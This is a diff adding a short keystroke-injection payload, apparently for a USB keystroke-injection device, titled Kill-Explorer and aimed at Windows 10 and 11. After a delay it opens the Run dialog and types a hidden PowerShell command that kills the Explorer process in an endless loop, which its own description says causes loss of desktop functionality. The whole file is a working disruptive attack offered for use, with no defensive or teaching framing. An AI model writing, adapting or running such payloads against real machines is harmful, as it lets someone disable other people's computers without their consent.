@@ -1,0 +1,12 @@
+REM_BLOCK
+Title: Kill-Explorer
+Version 1.0
+Target: Windows 10, 11
+Author: Nate
+Brief Description: Kill the explorer process repeatedly causing loss of Windows Desktop functionality.
+END_REM
+
+DELAY 2500
+GUI r
+DELAY 500
+STRINGLN powershell /w 1 while($true){kill -name explorer}
